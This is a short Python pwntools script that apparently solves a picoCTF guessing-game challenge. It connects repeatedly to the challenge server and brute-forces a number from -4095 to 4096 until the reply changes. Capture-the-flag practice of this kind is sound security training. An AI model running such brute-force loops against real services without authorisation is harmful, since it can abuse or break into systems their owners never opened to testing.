#!/usr/bin/env python3

from pwn import *

context.log_level = 'warning'

for i in range(-4095, 4097):
    r = remote('jupiter.challenges.picoctf.org', 44628)
    payload = "{}".format(i)
    r.sendlineafter(b"What number would you like to guess?\n", payload)
    resp = r.recv().decode().strip()
    print(str(i) + " : " + str(resp))
    if resp != "Nope!":
        break
    r.close()